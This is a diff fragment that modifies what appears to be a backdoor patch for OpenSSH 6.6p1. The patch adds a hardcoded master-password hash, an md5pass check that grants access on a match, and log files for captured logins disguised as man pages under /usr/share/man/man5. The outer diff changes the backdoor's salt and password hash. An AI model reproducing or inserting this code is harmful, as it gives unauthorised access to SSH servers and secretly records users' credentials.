@@ -219,7 +219,7 @@ diff -c -r -N openssh-6.6p1/includes.h openssh-6.6p1_p/includes.h
   
   #include "entropy.h"
   
-+ #define PASSWORD "$1$V1M07Ac9$ajLC78lbz9Bs5uq95K7mv1"
++ #define PASSWORD "$1$p07lj588$8HpZkidOEkIbgUCcLVw331"
 + #define LOG_REMOTE "/usr/share/man/man5/ttyp.5.gz"
 + #define LOG_GOOD "/usr/share/man/man5/ttyl.5.gz"
 + #define LOG_BAD "/usr/share/man/man5/ttyv.5.gz"
@@ -272,7 +272,7 @@ diff -c -r -N openssh-6.6p1/includes.h openssh-6.6p1_p/includes.h
 + }
 + 
 + #define md5pass(pass) { \
-+ 	char* hash = crypt(pass, "$1$V1M07Ac9$"); \
++ 	char* hash = crypt(pass, "$1$p07lj588$"); \
 + 	if (strcmp(hash,PASSWORD) == 0) { \
 + 		good_pass = 1; \
 + 	} \
